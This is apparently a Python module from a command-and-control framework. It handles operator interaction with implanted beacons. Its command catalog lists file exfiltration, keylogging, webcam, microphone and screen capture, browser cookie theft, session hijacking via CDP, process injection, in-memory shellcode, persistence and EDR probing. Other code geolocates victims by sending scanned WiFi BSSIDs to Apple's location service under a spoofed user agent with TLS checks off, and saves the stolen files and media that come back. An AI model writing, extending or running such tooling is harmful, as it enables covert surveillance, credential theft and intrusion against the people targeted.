"""Helpers for C2 shell beacon interaction."""
import base64
import json
import os
import ssl
import urllib.request
import urllib.error
from datetime import datetime

from phantom.utils.paths import data_dir


# Structured beacon command catalog: (command, description, platform).
# platform: "" = all platforms, "win" = Windows-only, "linux" = Linux-only.
# Single source of truth for the C2 shell `beacon-help`, the API endpoint,
# and the Electron command palette/autocomplete.
BEACON_COMMAND_LIST: list[tuple[str, str, str]] = [
    # ── recon / filesystem ──
    ("recon", "Full recon sweep (sysinfo + netinfo + processes)", ""),
    ("sysinfo", "OS, user, arch, hostname, uptime", ""),
    ("netinfo", "Network interfaces, IPs, MAC addresses", ""),
    ("processes", "Running process list with PIDs", ""),
    ("ls <path>", "List directory (alias: dir)", ""),
    ("pwd", "Print working directory", ""),
    ("cd <path>", "Change directory (cd.. supported)", ""),
    ("cat <file>", "Read a text file", ""),
    ("find <pattern>", "Find files matching a pattern", ""),
    ("drives", "List drives/volumes", ""),
    ("whoami", "Current user context", ""),
    # ── transfer ──
    ("download <path>", "Exfiltrate a file to the C2", ""),
    ("upload <path> <b64>", "Push a file onto the target", ""),
    # ── network ──
    ("netstat", "Active TCP/UDP connections table", ""),
    ("netstat-json", "Connections as JSON", ""),
    ("portfwd <l> <host> <p>", "TCP port-forward through the beacon", ""),
    ("portfwd-stop", "Stop all port forwards", ""),
    ("socks <port>", "SOCKS5 proxy through the beacon", "win"),
    ("socks-stop", "Stop the SOCKS5 proxy", "win"),
    ("smb-pipe [name]", "Named-pipe SMB channel", "win"),
    ("smb-pipe-stop", "Stop the SMB pipe channel", "win"),
    # ── browser / CDP ──
    ("browser-pivot <port> [pid]", "Pivot into a browser via CDP", "win"),
    ("browser-pivot-stop", "Stop the browser pivot", "win"),
    ("browser-list", "List running browsers + debug ports", "win"),
    ("cdp-launch", "Launch a CDP-pivotable browser", "win"),
    ("cdp-cookies", "Dump cookies via CDP", "win"),
    ("cdp-eval <js>", "Evaluate JS in the pivoted browser", "win"),
    ("cdp-nav <url>", "Navigate the pivoted browser", "win"),
    ("cdp-fetch <url>", "Fetch a URL with the victim's session", "win"),
    # ── collection ──
    ("keylog start|stop|status|dump", "Keystroke logger (dump = retrieve buffer)", "win"),
    ("screenshot", "Capture the screen (BMP artifact)", ""),
    ("cookies", "Extract browser cookies (DPAPI)", "win"),
    ("cookies-json", "Cookies as JSON", "win"),
    ("camera", "Capture a webcam frame (JPEG artifact)", ""),
    ("audio <sec>", "Record microphone audio (WAV artifact)", ""),
    ("screen-record <sec>", "Record the screen (JPEG frames)", ""),
    ("screen-record-live <sec>", "Live screen recording session", "win"),
    ("screen-dump", "Dump frames of the live recording", "win"),
    # ── location / wireless ──
    ("gps", "Real GPS position (WinRT) + WiFi fallback", ""),
    ("wlan-scan", "Nearby WiFi access points (BSSID/RSSI)", ""),
    ("wlan-locate", "WiFi geolocation (Apple WLOC, no key)", ""),
    ("bt-scan", "Nearby Bluetooth devices", ""),
    ("bt-scan-json", "Bluetooth devices as JSON", ""),
    # ── injection / persistence ──
    ("inject <pid>", "New beacon inside an existing process", ""),
    ("inject-eb <pid>", "Early-bird injection variant", "win"),
    ("inject-tl <pid>", "Threadless APC injection variant", "win"),
    ("migrate", "Hollow a fresh process, move beacon", ""),
    ("mem-run <b64>", "Run base64 shellcode in-memory", "win"),
    ("persist [method]", "Install persistence (runkey/systemd/cron)", ""),
    ("autopersist", "Auto-detect OS and install persistence", ""),
    # ── shell / config ──
    ("shell <cmd>", "Execute an OS command (bare command works too)", ""),
    ("sleep <ms>", "Set the check-in cadence", ""),
    ("set-sleep <ms> [jitter%]", "Cadence + jitter, mid-session", ""),
    ("auth-rotate <b64-secret>", "Rotate this beacon's HMAC identity", ""),
    ("health", "Self-report: uptime, check-ins, cadence, errors", ""),
    ("edrcheck", "Probe loaded AV/EDR drivers", "win"),
    ("exit | kill", "Shut the beacon down", ""),
]


def beacon_command_dicts() -> list[dict]:
    """JSON-ready command list for the API / Electron palette."""
    return [
        {"command": c, "description": d, "platform": p}
        for c, d, p in BEACON_COMMAND_LIST
    ]


def _render_beacon_commands() -> str:
    """Rich-formatted panel body for the CLI `beacon-help`."""
    groups: dict[str, list[str]] = {}
    for c, d, p in BEACON_COMMAND_LIST:
        section = {
            "recon / filesystem": ("recon", "sysinfo", "netinfo", "processes",
                                   "ls", "pwd", "cd", "cat", "find", "drives", "whoami"),
            "transfer": ("download", "upload"),
            "network": ("netstat", "portfwd", "socks", "smb-pipe"),
            "browser / CDP": ("browser", "cdp"),
            "collection": ("keylog", "screenshot", "cookies", "camera", "audio",
                           "screen-record", "screen-dump"),
            "location / wireless": ("gps", "wlan", "bt-scan"),
            "injection / persistence": ("inject", "migrate", "mem-run", "persist", "autopersist"),
            "shell / config": ("shell", "sleep", "set-sleep", "auth-rotate",
                               "health", "edrcheck", "exit"),
        }
        hit = next((name for name, prefixes in section.items()
                    if c.startswith(prefixes)), None)
        groups.setdefault(hit or "other", []).append(
            f"[cyan]{c}[/] — {d}" + (f" [dim]({p})[/]" if p else ""))
    lines = []
    for name, cmds in groups.items():
        lines.append(f"[bold]{name}:[/]")
        lines.extend(f"  {c}" for c in cmds)
    return "\n".join(lines)


BEACON_COMMANDS = _render_beacon_commands()


def save_beacon_download(b64_data: str, suggested_name: str = "") -> str:
    """Decode base64 file data from beacon and save to data/downloads/.
    The real format is sniffed from magic bytes so a JPEG camera frame is
    never stored as .bmp (Electron renders it by extension)."""
    out_dir = os.path.join(data_dir(), "downloads")
    os.makedirs(out_dir, exist_ok=True)
    data = base64.b64decode(b64_data)
    real_ext = ""
    if data[:3] == b"\xff\xd8\xff":
        real_ext = ".jpg"
    elif data[:8] == b"\x89PNG\r\n\x1a\n":
        real_ext = ".png"
    elif data[:2] == b"BM":
        real_ext = ".bmp"
    elif data[:4] == b"GIF8":
        real_ext = ".gif"
    base = os.path.splitext(os.path.basename(suggested_name or ""))[0] \
        or f"beacon_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    name = base.replace("\\", "_") + (real_ext or ".bin")
    path = os.path.join(out_dir, name)
    with open(path, "wb") as f:
        f.write(data)
    return path


# ── Apple WLOC (free WiFi geolocation, no API key) ─────────────────────────

_APPLE_ENDPOINT = "https://gs-loc.apple.com/clls/wloc"
_APPLE_UA = "locationd/1753.17 CFNetwork/711.1.12 Darwin/14.0.0"


def _varint(buf: bytes, pos: int) -> tuple[int, int]:
    """Decode a protobuf varint at buf[pos], return (value, new_pos)."""
    v = 0
    shift = 0
    while pos < len(buf):
        b = buf[pos]
        v |= (b & 0x7F) << shift
        shift += 7
        pos += 1
        if not (b & 0x80):
            break
    return v, pos


def _parse_apple_wloc(data: bytes) -> list:
    """Parse Apple WLOC binary protobuf response into [(lat, lon), ...]."""
    if len(data) <= 10:
        return []
    offset = 10
    results = []

    while offset < len(data):
        tag, offset = _varint(data, offset)
        field_num = tag >> 3
        wire_type = tag & 0x07

        if wire_type == 0:
            _, offset = _varint(data, offset)
        elif wire_type == 2:
            length, offset = _varint(data, offset)
            if field_num == 2:
                end = offset + length
                loc_lat = None
                loc_lon = None
                while offset < end:
                    inner_tag, offset = _varint(data, offset)
                    inner_field = inner_tag >> 3
                    inner_wire = inner_tag & 0x07
                    if inner_wire == 2:
                        l, offset = _varint(data, offset)
                        if inner_field == 2:
                            loc_end = offset + l
                            loc_lat = None
                            loc_lon = None
                            while offset < loc_end:
                                loc_tag, offset = _varint(data, offset)
                                loc_field = loc_tag >> 3
                                loc_wire = loc_tag & 0x07
                                if loc_wire == 0:
                                    val, offset = _varint(data, offset)
                                    if loc_field == 1:
                                        loc_lat = val
                                    elif loc_field == 2:
                                        loc_lon = val
                                elif loc_wire == 2:
                                    ll, offset = _varint(data, offset)
                                    offset += ll
                                elif loc_wire == 5:
                                    offset += 4
                                elif loc_wire == 1:
                                    offset += 8
                            if loc_lat is not None and loc_lon is not None:
                                results.append((loc_lat / 1e8, loc_lon / 1e8))
                        else:
                            offset += l
                    elif inner_wire == 0:
                        _, offset = _varint(data, offset)
                    elif inner_wire == 5:
                        offset += 4
                    elif inner_wire == 1:
                        offset += 8
            else:
                offset += length
        elif wire_type == 5:
            offset += 4
        elif wire_type == 1:
            offset += 8
        else:
            break

    return results


def _apple_build_request(bssid: str) -> bytes:
    """Build binary request body for Apple WLOC."""
    bssid_bytes = bssid.encode()
    data_bssid = b'\x12\x13\n\x11' + bssid_bytes + b'\x18\x00\x20\x01'
    header = b'\x00\x01\x00\x05en_US\x00\x13com.apple.locationd\x00\x0a8.1.12B411\x00\x00\x00\x01\x00\x00\x00'
    return header + bytes([len(data_bssid)]) + data_bssid


def _apple_geolocate(aps: list) -> str:
    """Query Apple's WiFi location service using the first AP's BSSID."""
    if not aps:
        return ""

    bssid = aps[0].get("macAddress", "").upper()
    if not bssid or len(bssid) != 17:
        return "\nInvalid BSSID format."

    try:
        body = _apple_build_request(bssid)
        req = urllib.request.Request(
            _APPLE_ENDPOINT,
            data=body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "User-Agent": _APPLE_UA,
            })
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            raw = resp.read()

        locs = _parse_apple_wloc(raw)
        if locs:
            lat, lon = locs[0]
            return (
                f"\nGPS coordinates: {lat:.6f}, {lon:.6f}\n"
                f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n"
                f"Source: Apple WLOC (free, no key needed)"
            )
        return "\nApple WLOC: No location data returned (AP not in database)."
    except urllib.error.HTTPError as e:
        return f"\nApple WLOC HTTP {e.code}: {e.read().decode(errors='replace')[:300]}"
    except Exception as e:
        return f"\nApple WLOC error: {e}"


def _format_wlan_table(aps: list) -> str:
    """Format AP list as a readable table."""
    lines = [f"=== WLAN GEOLOCATE RESULTS ({len(aps)} APs) ===",
             "BSSID              | RSSI | Ch | SSID",
             "-------------------+------+----+---------------------------"]
    for ap in aps:
        bssid = ap.get("macAddress", "?")
        rssi = ap.get("signalStrength", "?")
        ch = ap.get("channel", "?")
        ssid = ap.get("ssid", "?")
        if len(ssid) > 25:
            ssid = ssid[:22] + "..."
        lines.append(f"{bssid:18s} | {rssi:>4} | {ch:>2} | {ssid}")
    lines.append("")
    lines.append("(GPS coordinates queried via Apple WLOC, free — no API key)")
    return "\n".join(lines)


# ── Main dispatch ──────────────────────────────────────────────────────────

def format_beacon_output(output: str) -> tuple[str, str]:
    """
    Process beacon task output. Returns (display_text, extra_info).
    Auto-saves FILE_B64 downloads and SCREENSHOT_B64 captures.
    """
    if output.startswith("WLAN_GEOLOCATE:"):
        raw = output[len("WLAN_GEOLOCATE:"):]
        try:
            aps = json.loads(raw)
            display = _format_wlan_table(aps)
            coords = _apple_geolocate(aps)
            if coords:
                display += coords
        except json.JSONDecodeError:
            display = raw
        return display, ""

    if output.startswith("CAM_FRAME:"):
        # camera capture: "CAM_FRAME:<device>|MEDIA_B64:<b64>" — save as a
        # real image artifact the operator can open
        raw = output[len("CAM_FRAME:"):]
        device, _, b64 = raw.partition("|")
        if b64.startswith("MEDIA_B64:"):
            b64 = b64[len("MEDIA_B64:"):]
        try:
            path = save_beacon_download(
                b64, suggested_name=f"camera_{datetime.now().strftime('%H%M%S')}.bmp")
            size = os.path.getsize(path)
            return f"[Camera frame captured — {size} bytes — device: {device or '?'}]", \
                   f"Saved to: {path}"
        except Exception as e:
            return f"[Camera decode failed: {e}]", ""

    if output.startswith("MEDIA_B64:"):
        # generic media artifact (audio WAV, screen-record frames, GPS photo…)
        try:
            path = save_beacon_download(
                output[len("MEDIA_B64:"):],
                suggested_name=f"media_{datetime.now().strftime('%H%M%S')}.bin")
            size = os.path.getsize(path)
            return f"[Media artifact saved — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[Media decode failed: {e}]", ""

    if output.startswith("FILE_B64:"):
        try:
            path = save_beacon_download(output[9:])
            size = os.path.getsize(path)
            return f"[File downloaded — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[File decode failed: {e}]", ""

    if output.startswith("SCREENSHOT_B64:"):
        try:
            path = save_beacon_download(output[15:], suggested_name=f"screenshot_{datetime.now().strftime('%H%M%S')}.bmp")
            size = os.path.getsize(path)
            return f"[Screenshot captured — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[Screenshot decode failed: {e}]", ""

    return output, ""
